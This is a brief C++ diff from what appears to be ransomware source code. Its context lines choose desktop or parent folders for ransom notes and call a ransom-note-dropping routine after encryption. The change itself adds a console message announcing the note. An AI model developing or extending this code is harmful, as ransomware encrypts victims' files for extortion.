@@ -72,6 +72,7 @@ int main(int argc, char **argv){
 	if(common::Settings::SPAM_RANSOM_NOTES) ransomNoteLocations = parentPaths;
 	else ransomNoteLocations = {homeFolder / "Desktop"};
 	cryptor::Main::dropRansomNote(ransomNoteLocations, std::get<1>(encryptorResult), roots, std::get<0>(encryptorResult), homeFolder / "Desktop");
+	std::cout << "Generated ransom note. Check your desktop." << std::endl;
 
 
 	/*
